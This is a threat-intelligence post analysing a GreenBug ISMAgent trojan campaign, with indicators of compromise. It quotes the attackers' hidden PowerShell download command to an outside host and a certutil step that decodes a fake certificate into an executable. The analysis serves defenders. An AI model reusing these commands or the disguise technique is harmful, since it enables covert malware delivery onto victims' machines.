# Recent ISMAgent Samples and Infrastructure by Iranian Threat Group GreenBug

- **Source :** ClearSky Cybersecurity
- **URL :** https://www.clearskysec.com/ismagent/
- **Date :** 2017-08-28

---

Recently we detected new samples and Infrastructure of [ISMAgent, ](https://researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/) a trojan in use by Iranian Threat Group GreenBug. Interestingly, as part of the delivery mechanism, the malware is disguised as a base64 digital certificate and decoded via certutil.exe. This post describes the new campaign.

## change managment.dot

Sample _change managment.dot_ ([812d3c4fddf9bb81d507397345a29bb0](https://www.virustotal.com/en/file/66358a295b8b551819e053f2ee072678605a5f2419c1c486e454ab476c40ed6a/analysis/)) exploits CVE-2017-0199 and calls the following URL:

http://www.msoffice-cdn[.]com/updatecdnsrv/prelocated/owa/auth/template.rtf

![](https://www.clearskysec.com/wp-content/uploads/2017/08/Screenshot_3.jpg)

which in turn runs this command:

_“C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe” -nologo -WindowStyle Hidden $webClient = New-Object http://System.Net .WebClient; $val = $webClient.DownloadString(‘**https://a.pomf[.]cat/ntluca.txt** ‘); add-content -path ‘C:\Users\USER\AppData\Roaming/srvRep.txt’ -value $val -force_

The command downloads  _ntluca.txt_ from  _http://a.pomf[.]cat/ntluca.txt._

![](https://www.clearskysec.com/wp-content/uploads/2017/08/Screenshot_2.jpg)

Disguised as a base64 digital certificate, the file actually decodes to an ISMagent sample ([96b47c5af8652ac99150bf602a88498b](https://www.virustotal.com/en/file/33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647/analysis/)) via the following command:

_C:\Windows\System32\certutil.exe” -decode C:\Users\USER\AppData\Roaming\srvRep.txt C:\Users\USER\AppData\Roaming\srvConhost.exe_

## Indicators of compromise

Indicators of compromise are presented below and are [available on PassiveTotal](https://community.riskiq.com/projects/960320d5-f911-b4e5-05a7-9fabe4e145c9).

Domain | cdnmsnupdate[.]com  
---|---  
Domain | msoffice-cdn[.]com  
URL | http://74.91.19[.]122/action2/  
URL | http://82.102.14[.]246/webdav/aws.exe  
URL | http://www.msoffice-cdn[.]com/updatecdnsrv/prelocated/owa/auth/template.rtf  
URL | http://a.pomf[.]cat/ntluca.txt  
IP | 185.162.235.121  
IP | 82.102.14.246  
IP | 74.91.19.122  
Hash | 6d2f8a06534e2ebebc43295fb266a8ca  
Hash | 812d3c4fddf9bb81d507397345a29bb0  
Hash | 3d497c4711c0226d86a693a40891f9a1  
Hash | 96b47c5af8652ac99150bf602a88498b  
Hash | 66eaef10226fb279dba64bb5948bc85b  
Hash | 7d83715a9a6aabcbc621cc786de0c9ea  
Hash | 15d9d184b71d243ae5c005c68a045889  
whoisName | Neslihan Ozcivit  
whoisEmail | neslihan.ozcivit@mail.ru  
Filename | aws.exe  
Filename | Crypted.exe  
Filename | document-gerenated-problem.exe  
Filename | PolicyConverter.exe  
  
The Maltego graph below depicts the relationship among the indicators (click to enlarge):

[![](https://www.clearskysec.com/wp-content/uploads/2017/08/ISMAgent-550x236.jpg)](https://www.clearskysec.com/wp-content/uploads/2017/08/ISMAgent.jpg)